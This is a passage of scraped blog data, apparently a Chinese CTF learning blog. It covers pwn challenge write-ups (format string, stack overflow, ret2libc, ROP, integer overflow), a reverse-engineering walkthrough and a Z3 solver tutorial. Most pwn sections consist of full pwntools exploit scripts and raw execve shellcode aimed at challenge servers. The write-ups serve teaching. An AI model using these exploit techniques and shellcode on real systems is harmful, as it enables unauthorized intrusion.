0xed 0x7a0x65 0x5a 0x1f 0x4e 0xf6 0xf8 0x86 0x300xf0 0x4c 0xb7 0xca 0xe5 0x89 0x2a 0x1d0xe4 0x16 0xf5 0x3a 0x27 0x28 0x8d 0x400x09 0x03 0x6f 0x94 0xa5 0x4a 0x46 0x670x78 0xb9 0xa6 0x59 0xea 0x22 0xf1 0xa20x71 0x12 0xcb 0x88 0xd1 0xe8 0xac 0xc60xd5 0x34 0xfa 0x69 0x97 0x9f 0x25 0x3d0xf3 0x5b 0x0d 0xa1 0x6b 0xeb 0xbe 0x6e0x55 0x87 0x8f 0xbf 0xfc 0xb3 0x91 0xe90x77 0x66 0x19 0xd7 0x24 0x20 0x51 0xcc0x52 0x7d 0x82 0xd8 0x38 0x60 0xfb 0x1c0xd9 0xe3 0x41 0x5f 0xd0 0xcf 0x1b 0xbd0x0f 0xcd 0x90 0x9b 0xa9 0x13 0x01 0x730x5d 0x68 0xc1 0xaa 0xfe 0x08 0x3e 0x3f0xc5 0x8b 0x00 0xd3 0xfd 0xb6 0x43 0xbb0xd4 0x80 0xe2 0x0c 0x33 0x74 0xa8 0x2b0x54 0x4d 0x2d 0xa4 0xdc 0x6c 0x3b 0x210x2e 0xab 0x32 0x5c 0x7b 0xe0 0x9d 0x6a0x39 0x14 0x3c 0xb8 0x0a 0x53 0xf7 0xdd0xf4 0x2c 0x98 0xba 0x05 0xe1 0x0e 0xa3'''L = str.split()L = [int(i,16) for i in L]flag = ''for i in List: flag += chr(L.index(i))print flag","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"攻防世界-Pwn","slug":"攻防世界-Pwn","date":"2019-08-08T07:54:47.000Z","updated":"2020-02-28T16:07:17.759Z","comments":true,"path":"2019/08/08/攻防世界-Pwn/","link":"","permalink":"http://liul14n.top/2019/08/08/攻防世界-Pwn/","excerpt":"","text":"- exp中所涉及的所有端口都要以题目中给的端口为准,攻防世界这个平台同一道题目。。不同时间来做的话,端口不一样。。。0x01 get_shell纯新手题。Linux系统 nc连接到题中给的地址,然后cat flag即可。0x02 CGfsb考察格式化字符串漏洞。emmm Freebuf上有很详细的格式化字符串漏洞原理及利用的讲解,链接如下。传送门传送门这个具体偏移可以手动测出来。测出来为10,所以exp中就用%10$n了。pwnme的地址在IDA中就能找出来,是0x0804A068所以exp为:1234567891011121314151617#coding:utf-8from pwn import *c = remote(\"111.198.29.45\",37724)pwnme = 0x0804A068c.recvuntil('please tell me your name:')c.sendline(\"aaaa\")#这个随便输,但是输入需要小于等于10个字节。c.recvuntil('leave your message please:')c.sendline(p32(pwnme)+'a'*4+'%10$n')#因为p32(pwnme)占4个字节, 而需要在%10$n前面输入8个字节,所以还需要补4个字节,所以加了4个ac.interactive()补充后来在看一篇文章的时候发现了一个点。改进后的exp如下:12345678910111213from pwn import *c = remote('111.198.29.45',33602)c.recvuntil('please tell me your name:')c.sendline('aaa')pwnme = 0x0804A068c.sendline('a'*8 +'%14$naaa' +p32(pwnme))c.interactive()0x03 when_did_you_born考察栈溢出、变量覆盖。var_20 就是v4, var_18就是v5,他俩之间隔了8个字节。根据逻辑,第一次我们输入一个不是1926的数字,然后通过危险函数gets 将读入的数据存入v4, 通过溢出来覆盖v5,让v5的值为1926从而cat flagexp如下:12345678910111213from pwn import *c = remote('111.198.29.45',41955)c.recvuntil('Birth?')c.sendline(\"9999\")c.recvuntil('Name?')c.sendline(\"a\"*8 + p32(1926))c.interactive()0x04 hello_pwn考察的和上一个题几乎一样。。。还是直接覆盖..exp如下:1234567891011from pwn import *c = remote('111.198.29.45',30278)payload = 'a'*4 +p64(1853186401)c.recvuntil('lets get helloworld for bof')c.sendline(payload)c.interactive()0x05 level0考察栈溢出。很明显的栈溢出存在/bin/sh而且有被system函数调用所以 exp如下:1234567891011from pwn import *c = remote('111.198.29.45',34452)payload = 'a'*(0x80+8) + p64(0x0000000000400596)c.recvuntil('Hello, World\\n')c.sendline(payload)c.interactive()0x06 level2典型的栈溢出。存在/bin/sh但是没有调用。存在system函数但是是用来echo一些信息的。所以直接把system函数的参数修改成/bin/sh就好了。exp如下:12345678910111213141516171819# -*- coding: UTF-8 -*-from pwn import *c = remote('111.198.29.45',55974)elf = ELF('./level2')sys_add = elf.symbols['system']binsh_add = elf.search('/bin/sh').next()#也可以直接用上图中找到的0x0804A024payload = 'a'*(0x88+0x4) + p32(sys_add) + p32(0x0) + p32(binsh_add)#为什么payload是这个顺序请看下文。c.recvuntil('Input:')c.sendline(payload)c.interactive()为什么payload是上面那个顺序？答:在32位程序运行中，函数参数直接压入栈中调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1而在64位程序运行中，参数传递需要寄存器64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中参数超过六个时，从第七个开始压入栈中0x07 guess_numvar_30就是 v8, seed就是seed, 可以进行覆盖,间隔为0x20个字节。思路一覆盖seed为1, 模拟执行srand(1),然后在exp中模拟得到v7的各值进行输入。但是需要知道该程序的libc。可以通过如下方法得到libc版本。方法一利用pwntools的ELF模块。方法二ldd命令。思路一的exp如下:1234567891011121314151617181920from pwn import *from ctypes import *c = remote('111.198.29.45',59620)c.recvuntil('Your name:')libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')payload = 'a'*(0x20) + p64(1)c.sendline(payload)libc.srand(1)for i in range(10): c.recvuntil('Please input your guess number:') c.sendline(str(libc.rand()%6+1))c.interactive()思路二覆盖seed, 然后直接求出10次 rand()%6+1,得到如下输出。exp如下:1234567891011121314151617from pwn import *c = remote('111.198.29.45',54730)c.recvuntil('Your name:')payload = 'a'*(0x20)+p64(1)c.sendline(payload)L = [2,5,4,2,6,2,5,1,4,2]for i in L: c.recvuntil('Please input your guess number:') c.sendline(str(i))c.interactive()0x08 cgpwn2观察字符串发现并没有/bin/sh,但是有对bss段的name的操作,可以通过将/bin/sh写入name,然后构造payload。在32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1所以随便找一个返回地址0x0804854Dexp如下:12345678910111213141516171819202122232425from pwn import *context.log_level=\"debug\"c = remote('111.198.29.45',45942)elf = ELF('./cgpwn2')system = elf.symbols['system']bin_sh = '/bin/sh'bin_add = 0x0804A080back = 0x0804854Dc.recvuntil('please tell me your name')c.sendline(bin_sh)c.recvuntil('hello,you can leave some message here:')payload = 'a'*(0x26+4) + p32(system) + p32(back) + p32(bin_add)c.sendline(payload)c.interactive()0x09 string题目宛如玩RPG游戏。先是给了你俩secret 让你去打龙, secret[0]就是v3的首地址,后面会用到。然后让你输入角色名字来创建角色。问你往哪走, 很明显根据逻辑需要走east让你给它个地址,然后输入你的愿望,这里有明显的格式化字符串漏洞printf(&amp;format, &amp;format);最后如果*a1 == a1[1] 即 最开始的v3[0] = 85,巫师就会帮助你,你就可以自己创造一个v1函数来执行了,这个函数肯定要创造成能拿到shell的函数。目标地址直接传给了v2, v2和format相连。_isoc99_scanf(&quot;%s&quot;,&amp;format);到format的偏移为8,但是目标地址是存入v2了,所以实际偏移应该为8-1=7shellcode就是通用的shellcode了,具体看下面链接。传送门传送门exp如下:123456789101112131415161718192021222324252627282930313233343536373839from pwn import *c = remote('111.198.29.45',34306)c.recvuntil('secret[0] is ')add = c.recvuntil('\\n')[:-1]add = int(add,16)c.recvuntil('name be:')c.sendline('LiuLian')c.recvuntil('east or up?:')c.sendline('east')c.recvuntil('leave(0)?:')c.sendline('1')c.recvuntil('Give me an address')c.sendline(str(add))c.recvuntil('you wish is:')payload = 'a'*85 + '%7$n'c.sendline(payload)shellcode = \"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\"c.recvuntil('USE YOU SPELL\\n')c.sendline(shellcode)c.interactive()0x10 int_overflow考察整数溢出漏洞。这是个模拟登陆系统。俩read函数都没有溢出点,接着查看check_passwd函数。发现了危险函数strcpy,s(即passwd)的空间明显大于dest的空间,可以通过这里进行溢出。但是要进入这个else语句,需要 v3(即passwd的长度)大于3 小于等于8,但是很明显这个长度根本不够写payload,所以要在这里进行整形溢出。查看汇编语言可以看到passwd的长度是用al寄存器来传值的,而al寄存器是8位寄存器,传值的范围为0~255,超过这个范围就会造成溢出。实际长度256的话,传值以后为0, 257-&gt;1, 258-&gt;2 …以此类推。所以我们只需要让这个s(即passwd)的长度在260~264之间即可。查找字符串能找到cat flag 来到对应位置,是一个后门函数。后门函数的地址为0x0804868Bdest距离ebp的偏移为0x14,覆盖ebp需要4个字节,所以得到payload为:payload = &#39;a&#39;*0x14 + &#39;a&#39;*4 + p32(0x0804868B) + &#39;a&#39;*(260-0x14-4-4)payload不唯一, 最后那个地方,260~264都可以。exp如下:12345678910111213141516171819from pwn import *c = remote('111.198.29.45',52568)payload = 'a'*0x14 + 'a'*4 + p32(0x0804868B) + 'a'*(260-0x14-4-4)c.recvuntil('Your choice:')c.sendline('1')c.recvuntil('Please input your username:')c.sendline('LiuLian')c.recvuntil('Please input your passwd:')c.sendline(payload)c.interactive()0x11 level3这题是Jarvis OJ - [XMAN]的原题,但是在攻防世界平台上面出了点bug,题目没给全(少了libc-2.19.so),而且远程怎么都跑不出来。原题链接:传送门以原题为例吧。read函数位置存在明显的栈溢出,但是这个题和level2不同,level2程序中存在system函数和/bin/sh,只是system函数用来echo一些信息,/bin/sh没有被调用。但是这道题目程序中没有system函数,也不存在/bin/sh。由于题目给了libc文件,考虑ret2libc。正常的溢出思路如下。但是由于不知道sys_addr和bin addr的值,我们要想办法知道这俩的值。但是我们可以利用函数在内存中的地址和libc文件中的偏移的差相等,通过程序中的已有函数,比如read和write来获得这个偏移差。而且给了libc文件,我们就能知道system函数和/bin/sh在libc文件中的地址,从而通过sys_addr - sys_libc == write_addr - write_libc == 偏移差offset,得到sys_addr,同理可得bin addr。曾试了好久能不能直接把writegot的值直接print出来,然而并没有成功,可能因为我太菜了,也可能是因为这个办法不可行。有一些技术性的文章,对做这个题目挺有帮助的,强烈建议看一看第一篇。传送门传送门这道题目用到了这么一个点。基本思路已经很清晰了。在32位程序运行中，函数参数直接压入栈中调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1所以我们要想办法构成这种形式,我们的调用函数即write函数,后面的参数都是传给这个write函数的,调用完毕以后返回到我们的函数的返回地址。从而exp如下:12345678910111213141516171819202122232425262728293031# encoding:utf-8from pwn import *#io = process(\"./level3\")io = remote(\"pwn2.jarvisoj.com\",9879)elf = ELF(\"./level3\")writeplt = elf.plt[\"write\"]#plt和got都在可执行程序中writegot = elf.got[\"write\"]func = elf.symbols[\"vulnerable_function\"]print writegotprint u32(writegot)libc = ELF(\"./libc-2.19.so\")writelibc = libc.symbols[\"write\"]#libc中可以找到程序中有的/没有的函数的偏移syslibc = libc.symbols[\"system\"]binlibc = libc.search(\"/bin/sh\").next()payload1 = 'a' * 0x88 + 'a'*4 + p32(writeplt) + p32(func) + p32(1)+p32(writegot)+p32(4)#溢出地址+返回地址+参数io.recvuntil(\"Input:\\n\")io.sendline(payload1)writeaddr = u32(io.recv(4))#由于python没有指针，不能*write_got，需要将其输出并保存sysaddr = writeaddr - writelibc + syslibc#利用偏移量相等获得其真实地址binaddr = writeaddr - writelibc + binlibcpayload2 = 'a' * 0x88 + 'a'*4 + p32(sysaddr) + p32(func) + p32(binaddr)io.recvuntil(\"Input:\\n\")io.sendline(payload2)io.interactive()io.close()后续补充后来在刷BUUCTF的时候写了一个能打通的EXP1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import *#context.log_level = 'debug'#c = process('./level3')elf = ELF('./level3')#libc = ELF('/lib/i386-linux-gnu/libc.so.6')c = remote('node3.buuoj.cn',26690)main = 0x08048484c.recvuntil('Input:\\n',timeout = 0.5)payload = 'a'*0x88 + 'bbbb' + p32(elf.plt['write']) + p32(main) + p32(1) + p32(elf.got['write']) + p32(4)c.sendline(payload)write_addr = u32(c.recv(4))log.success('write_addr = ' + hex(write_addr))libc = LibcSearcher('write',write_addr)libcbase = write_addr - libc.dump('write')system = libcbase + libc.dump('system')binsh = libcbase + libc.dump('str_bin_sh')c.recvuntil('Input:\\n',timeout = 0.5)payload = 'a'*0x88 + 'bbbb' + p32(system) + p32(0xdeadbeef) + p32(binsh)c.sendline(payload)c.interactive()新手练习区已完结","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"Bugku-Pwn4","slug":"Bugku-Pwn4","date":"2019-08-04T15:20:27.000Z","updated":"2019-09-06T05:43:43.333Z","comments":true,"path":"2019/08/04/Bugku-Pwn4/","link":"","permalink":"http://liul14n.top/2019/08/04/Bugku-Pwn4/","excerpt":"","text":"0x00前言新接触Pwn不久,以这道题为例,记录一下自己的学习经历。这道题在网上能搜到WP,比着WP能很容易做出来,但是对没啥pwn基础的我来说想要弄懂却不容易。写这篇文章希望能帮助到想搞懂这道题目但是却不能被现有的wp满足的pwner们。0x01理论分析检查了一番,没开启啥保护。根据main函数能看出来是考察的栈溢出, memset对s只开辟了0x10大小的空间,但是read却读入了0x30个字节, 会造成溢出。这是一张在别的地方拿来的图(32位), 0x28个字节的栈空间下面是EBP和返回地址。64位程序类似, 只不过EBP变成RBP 然后它们的大小都变成了0x8个字节,那些Hello能写到一行,World能写到一行了。按照一般思路, 需要覆盖掉EBP, 然后 再将返回地址覆盖成我们想让程序跳转到的地址,一般是调到能拿到shell的地方比如System(&quot;/bin/sh&quot;)那么搜索关键字符串/bin/sh并没有找到,但是却有$0在Linux中:12345$# 是传给脚本的参数个数 $0 是脚本本身的名字 $1是传递给该shell脚本的第一个参数 $2是传递给该shell脚本的第二个参数 $@ 是传给脚本的所有参数的列表$0在linux中为为shell或shell脚本的名称system()会调用fork()产生子进程，由子进程来调用/bin/sh -c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将$0作为system的参数，能达到传入&#39;/bin/sh&#39;一样的效果。即system(&quot;$0&quot;) == system(&#39;bin/sh&#39;)$0在这一句的末端, 直接查偏移就行,即从0000000000601100开始往右数,看第几个是$就行。举个例子:0000000000601100代表这一整串,0000000000601101代表从9往后(包括9)这一整串,0000000000601102代表从8往后(包括8)这一串…..以此类推得到$0的地址为0x000000000060111f得到了一个/bin/sh 但是还需要能够调用这个/bin/sh的函数,也就是system()函数通过在IDA查看import调用, 找到了system函数现在需要得到它的地址。把这个Line prefixes(graph) 前面的勾打上就能显示地址了。这样得到了system函数的地址为0x000000000040075A根据之前的思路, 我们通过覆盖程序的返回地址来让程序跳转到我们想让它跳到的地方。但是,只调到system函数是不够的,因为我们还没有把/bin/sh这个参数给它传进去。(调用函数前需要先传入参数)所以现在需要先把参数传进去。64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）。我们的参数只有一个,所以是用rdi来传参的。小难点以下内容可能会有些迷,别急,后续会有详细的调试以及讲解。我们需要将参数pop到rdi中,因此我们需要调用pop rdi;ret所以我们去找这条命令的地址。关于为什么是pop rdi;ret 而不只是pop rdi,后续也会有讲解。可以利用ROPgadget工具进行查找。这样我们得到了pop rdi;ret的地址0x00000000004007d3。0x02拿Flag先给出脚本,运行脚本前需要安装pwntools:123456789101112131415161718192021#coding:utf-8from pwn import *c = remote('114.116.54.89', 10004)pop_rdi_ret = 0x00000000004007d3 bin_sh = 0x000000000060111fsystem = 0x000000000040075Apayload = ''payload += 'A'*0x10 #这0x10个是用来覆盖那0x10字节的栈空间的。payload += 'A'*0x8 #这0x8是覆盖RBP的,因为是64位程序,RBP大小为0x8payload += p64(pop_rdi_ret) #64位程序用p64,这三行为什么是这个顺序,待会会有讲解。payload += p64(bin_sh) payload += p64(system) c.recvuntil('Come on,try to pwn me')c.sendline(payload)c.interactive()运行即可拿到flag0x03调试与分析通过IDA server来调试一下程序。(这个具体怎么操作,百度就行,有很详细的教程)在大佬的指导下写了另一个用来调试的脚本exp.py。运行linux_server64 同时 运行exp在IDA选择Remote Linux debugger,然后选择Attach to process...然后Ctrl+F搜索 pwn4选中点击确定即可调试。在read后的一句下断点。也就是图中紫色这一句。 然后F8单步在栈窗口能看到我们的payload已经传入了。第1点那两行414141…就是’A’*0x10第2点那一行616161…就是’a’*0x8,这里是RBP所在的地方(现在依然也是RBP所在的地方,只不过内容变了),现在被这一串61覆盖了。第3点而0x00000000004007D3所在位置,曾经是原本程序的返回地址,现在这个位置依然是返回地址,不过变成pop rdi;ret的地址了, 也就是说程序会返回到pop rdi;ret的地址执行pop rdi;ret,而不会按程序原本的逻辑来执行了。第4点0x000000000060111F就是$0即/bin/sh的地址了。第5点0x000000000040075A即system函数的地址单步来到这,是一个leave指令,这个指令等价于mov rsp,rbp ，pop rbp执行前,栈和寄存器的状态是这样的,注意观察RSP,RBP。栈窗口中深色的那一行即为RSP目前指向的位置。执行后是这样的。这说明了上述第2点和第3点。补充我在分析的时候产生了这样的疑惑。leave相当于mov rsp,rbp ，pop rbp那mov rsp,rbp以后 rsp应该指向61616161...那一行啊,为什么现在却指向了61616161...下面的那一行?请教大佬后得知,这是因为pop rbp相当于mov rbp,[rsp],add rsp,0x832位的话就是add esp,0x4这样就导致了rsp指向了现在它所指的位置。接下来就要执行retn指令了。retn，等价于pop riprip存放的是下一条指令的地址。pop rip就相当于把rsp指向的东西传入到rip中,现在rsp指向的是我们传进去的pop rdi;ret的地址, 所以这样就能让rip里存的是pop rdi;ret的地址,所以执行完retn后就会执行pop rdi;ret。F8单步运行,rip 如我们所愿变成了pop rdi;ret的地址, 左侧窗口也变成了pop rdi的位置,rsp指向了$0即/bin/sh所在的地方。接着单步运行的话, 会执行pop rdi指令,就能将rsp现在所指的/bin/sh传入到rdi中,用rdi来为system函数进行传参。继续F8单步运行。如我们所愿。左侧来到了retn的位置,现在来讲一下前面留下来的问题:“当时找的为什么是pop rdi;ret 而不只是pop rdi”假设我们用的pop rdi,确实能够将/bin/sh传入到rdi中,但是我们就没办法执行system函数了,因为如果用pop rdi的话,执行完pop rdi以后就没有指令能将rip执行system函数的地址了。为了更好地说明问题,再观察一下现在的栈及寄存器的情况。rsp指向了system函数的地址, rip中存的是retn指令的地址,下一步就会执行retn,执行完以后rip里存的就是system函数的地址了,然后就能执行system函数了。继续F8单步运行。如我们所愿,rip指向了system函数的地址,rdi里存的是/bin/sh这样就能调用system函数了,就能得到shell了。0x04写在最后我新接触pwn,还在慢慢爬坑,很用心地写了这篇文章来帮助同样在爬坑的人学习pwn,如果有什么地方有不足之处,希望大佬们能帮我指出。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"SKSEC Summer Training","slug":"SKSEC-Summer-Training","date":"2019-07-28T13:43:12.000Z","updated":"2020-04-08T12:56:04.771Z","comments":true,"path":"2019/07/28/SKSEC-Summer-Training/","link":"","permalink":"http://liul14n.top/2019/07/28/SKSEC-Summer-Training/","excerpt":"","text":"# 0x01 RE-WhiteHat #独立完成的部分题目下载地址如下:传送门打开以后是一个提示输入Key的框框,随便输点然后点Check,并没有什么反应。查壳,无壳。拖入OD调试, 尝试在点击Check以后断住程序,然后再想办法搞到Flag 但是…断不住。拖入IDA, 一大堆sub_xxxxx看得头都大了一圈。大致分辨出这应该是个MFC程序。start函数就这么一点。__security_init_cookie函数也没啥重要内容。start函数返回的这个函数也没啥重要内容…现在的难点变成了如何定位到关键函数。手动挨个查看那一大堆sub_xxxx太费时间了, Shift + F12查看一下字符串, 然后发现了可疑字符串和两个可疑文件。来到这些字符串对应的函数的位置。大概看懂了一部分吧,然后就不知道该干嘛了。借助WP完成的部分借助WP 了解到了一款软件 Resource Hacker关于这款软件的一些用法,参照http://www.seotest.cn/jiaocheng/7636.html这款软件好像对处理GUI程序挺有用的。根据IDA中这一块,RecourseHacker中141标号即2.exe这个文件142标号即b.dll这个文件, 但是却是一堆乱码。用这个软件提取出来这两个文件。由下面这一块 , 借助WP试出来a1 = 0x32第一个字符串得到:sc create Pt type= filesys binPath=第二个字符串得到:sc start PtQ1:but这俩字符串有啥用？根据WP(菜是原罪) 分析2.exe这个文件。程序把b.dll的内容与v12进行异或,然后写入Src(flag.dll)中。Q2:是否能通过直接运行2.exe来完成上述步骤?那么就按照程序的步骤手动来呗？ 但是又遇到了新麻烦。b.dll里面的内容长度是3436,但是 用python还有C进行文件读操作读出来的长度都只有107,读到9M#后就不再读下去了,导致后续的异或操作无法正常进行。Q3:为什么会出现只能read()一部分的这种情况?无奈之下只能通过010Editor提取16进制数据了然后写了个小程序手动完成2.exe执行的操作123456789101112# -*- coding: UTF-8 -*-f = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\b','r')#b里面是从b.dll提取出来的16进制数据buffer = f.read()L = buffer.replace('\\n',' ').split(' ')L.pop()#消除最后因为替换\\n为空格而带来的多余的一个空格ff = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\flag.dll','wb')for i in L: x = chr(int(i,16)^0x36) ff.write(x)f.close()ff.close()运行得到flag.dll查看文件头发现是个png文件, 修改拓展名为png得到flag的图片。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"Z3约束初体验","slug":"Z3约束初体验","date":"2019-06-14T14:41:59.000Z","updated":"2019-10-31T12:26:27.244Z","comments":true,"path":"2019/06/14/Z3约束初体验/","link":"","permalink":"http://liul14n.top/2019/06/14/Z3约束初体验/","excerpt":"","text":"0x01拿一道CTF题目为例,主函数如下这是一个关于矩阵的题目。思路很清晰,函数名称也直接表达出来函数作用了。 但是求解是现在的难题了。如果考虑正向爆破… 难度太大太大,太费时间了, 毕竟有27个未知数呢。为什么是27而不是36？ 因为根据1234567891011gets(flag);for ( i = 0; i &lt;= 35; ++i )&#123; if ( !flag[i] ) &#123; flag[i] = 1; ++v4; &#125;&#125;if ( v4 != 9 ) exit(0);需要让v4 = 9，那么也就需要 !flag[i]满足9次,而flag的大小是36, 即 只输入27个数就能满足题意。现在需要提取出来题目给的矩阵(即题中的d)123456d = [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297, 0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230, 0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD, 0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7, 0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C, 0x297,0x230,0x1BD,0x1F7,0x15C,0x6]网上找到一脚本:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from z3 import *#引入time模块只是为了看一看这个程序跑完需要多长时间import timet1 = time.time()#创建一个解决方案实例solver = Solver()#flag长度先设置为36，包括尾部的9个1flag = [Int('flag%d'%i) for i in range(36)]#保存flag的矩阵a = [i for i in flag]#保存flag的转置矩阵b = [i for i in range(36)]#保存a*b的矩阵c = [0 for i in range(36)]#堆中正确flag的运算结果d = [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297, 0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230, 0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD, 0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7, 0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C, 0x297,0x230,0x1BD,0x1F7,0x15C,0x6]#获得a的转置矩阵for i in range(6): for j in range(6): b[i+6*j] = a[6*i+j]#运算a*bfor i in range(6): for j in range(6): for k in range(6): c[j+6*i] = c[j+6*i] + a[6*i+k]*b[6*k+j] #添加约束，正确flag的运算结果 solver.add(simplify(c[j+6*i]) == d[j+6*i])#添加约束，除了尾部，flag的字符一定在可见字符范围内for i in range(6,36-10): solver.add(flag[i]&gt;=32) solver.add(flag[i]&lt;=127)#添加约束，由于flag有格式，前6位一定为whctf&#123;for i in range(6): solver.add(flag[i] == ord('whctf&#123;'[i]))#添加约束，根据题意flag的尾部为9个1for i in range(36-9,36): solver.add(flag[i] == 0x1)#添加约束，flag的最后一个肯定是&#125;solver.add(flag[-10] == ord('&#125;'))#这里一定要有，不check的话会报错if solver.check() == sat: m = solver.model() f = '' #获得结果 for i in range(36): f+=chr(eval(str(solver.model().eval(flag[i])))) #输出flag print felse: print('error')t2 = time.time()print(t2-t1)鉴于有27个未知数,正如求解27元方程组一般,如果知道的关系越多,那么求解起来越容易, 求解所用时间也就越少。我把 “#添加约束，由于flag有格式，前6位一定为whctf{ “这个条件约束去掉以后再去跑的话 跑了74秒,而按照上面脚本跑的话,只需要3.2秒。不难看出z3求解的约束条件就是把题中给的关系进行还原,然后让约束求解器进行求解,我们所须要做的工作就是把条件列出来。顺带说一下 s.append(m[flag[i]].as_long()) 中的as_long()的大致作用。如果去掉这个.as_long(),而只保留m[flag[i]]则下面for i in s: 中的i的类型是instance类型,从而导致 flag+=chr(i)中的chr()方法无法正常使用(因为chr()里面需要传入int型的数据。)所以这个as_long()的功能大概就是把数据转为int类型吧。0x02拿一道22元方程组求解的数学题目为例,直接上脚本了。12345678910111213141516171819202122232425262728293031323334353637383940414243#coding:utf-8from z3 import *import timet1 = time.time()a = [Int('a%d'%i) for i in range(22)]s = Solver()s.add(2*a[0]+3*a[1]+5*a[2]+7*a[3]+11*a[4]+13*a[5]+17*a[6]+19*a[7]+23*a[8]+29*a[9]+31*a[10]+37*a[11]+41*a[12]+43*a[13]+47*a[14]+53*a[15]+59*a[16]+61*a[17]+67*a[18]+71*a[19]+73*a[20]+79*a[21]==83948)s.add(83*a[0]+89*a[1]+97*a[2]+101*a[3]+103*a[4]+107*a[5]+109*a[6]+113*a[7]+127*a[8]+131*a[9]+137*a[10]+139*a[11]+149*a[12]+151*a[13]+157*a[14]+163*a[15]+167*a[16]+173*a[17]+179*a[18]+181*a[19]+191*a[20]+193*a[21]==321979)s.add(197*a[0]+199*a[1]+211*a[2]+223*a[3]+227*a[4]+229*a[5]+233*a[6]+239*a[7]+241*a[8]+251*a[9]+257*a[10]+263*a[11]+269*a[12]+271*a[13]+277*a[14]+281*a[15]+283*a[16]+293*a[17]+307*a[18]+311*a[19]+313*a[20]+317*a[21]==602643)s.add(331*a[0]+337*a[1]+347*a[2]+349*a[3]+353*a[4]+359*a[5]+367*a[6]+373*a[7]+379*a[8]+383*a[9]+389*a[10]+397*a[11]+401*a[12]+409*a[13]+419*a[14]+421*a[15]+431*a[16]+433*a[17]+439*a[18]+443*a[19]+449*a[20]+457*a[21]==917405)s.add(461*a[0]+463*a[1]+467*a[2]+479*a[3]+487*a[4]+491*a[5]+499*a[6]+503*a[7]+509*a[8]+521*a[9]+523*a[10]+541*a[11]+547*a[12]+557*a[13]+563*a[14]+569*a[15]+571*a[16]+577*a[17]+587*a[18]+593*a[19]+599*a[20]+601*a[21]==1238849)s.add(607*a[0]+613*a[1]+617*a[2]+619*a[3]+631*a[4]+641*a[5]+643*a[6]+647*a[7]+653*a[8]+659*a[9]+661*a[10]+673*a[11]+677*a[12]+683*a[13]+691*a[14]+701*a[15]+709*a[16]+719*a[17]+727*a[18]+733*a[19]+739*a[20]+743*a[21]==1565673)s.add(751*a[0]+757*a[1]+761*a[2]+769*a[3]+773*a[4]+787*a[5]+797*a[6]+809*a[7]+811*a[8]+821*a[9]+823*a[10]+827*a[11]+829*a[12]+839*a[13]+853*a[14]+857*a[15]+859*a[16]+863*a[17]+877*a[18]+881*a[19]+883*a[20]+887*a[21]==1917643)s.add(907*a[0]+911*a[1]+919*a[2]+929*a[3]+937*a[4]+941*a[5]+947*a[6]+953*a[7]+967*a[8]+971*a[9]+977*a[10]+983*a[11]+991*a[12]+997*a[13]+1009*a[14]+1013*a[15]+1019*a[16]+1021*a[17]+1031*a[18]+1033*a[19]+1039*a[20]+1049*a[21]==2280667)s.add(1051*a[0]+1061*a[1]+1063*a[2]+1069*a[3]+1087*a[4]+1091*a[5]+1093*a[6]+1097*a[7]+1103*a[8]+1109*a[9]+1117*a[10]+1123*a[11]+1129*a[12]+1151*a[13]+1153*a[14]+1163*a[15]+1171*a[16]+1181*a[17]+1187*a[18]+1193*a[19]+1201*a[20]+1213*a[21]==2625651)s.add(1217*a[0]+1223*a[1]+1229*a[2]+1231*a[3]+1237*a[4]+1249*a[5]+1259*a[6]+1277*a[7]+1279*a[8]+1283*a[9]+1289*a[10]+1291*a[11]+1297*a[12]+1301*a[13]+1303*a[14]+1307*a[15]+1319*a[16]+1321*a[17]+1327*a[18]+1361*a[19]+1367*a[20]+1373*a[21]==3001323)s.add(1381*a[0]+1399*a[1]+1409*a[2]+1423*a[3]+1427*a[4]+1429*a[5]+1433*a[6]+1439*a[7]+1447*a[8]+1451*a[9]+1453*a[10]+1459*a[11]+1471*a[12]+1481*a[13]+1483*a[14]+1487*a[15]+1489*a[16]+1493*a[17]+1499*a[18]+1511*a[19]+1523*a[20]+1531*a[21]==3399957)s.add(1543*a[0]+1549*a[1]+1553*a[2]+1559*a[3]+1567*a[4]+1571*a[5]+1579*a[6]+1583*a[7]+1597*a[8]+1601*a[9]+1607*a[10]+1609*a[11]+1613*a[12]+1619*a[13]+1621*a[14]+1627*a[15]+1637*a[16]+1657*a[17]+1663*a[18]+1667*a[19]+1669*a[20]+1693*a[21]==3746423)s.add(1697*a[0]+1699*a[1]+1709*a[2]+1721*a[3]+1723*a[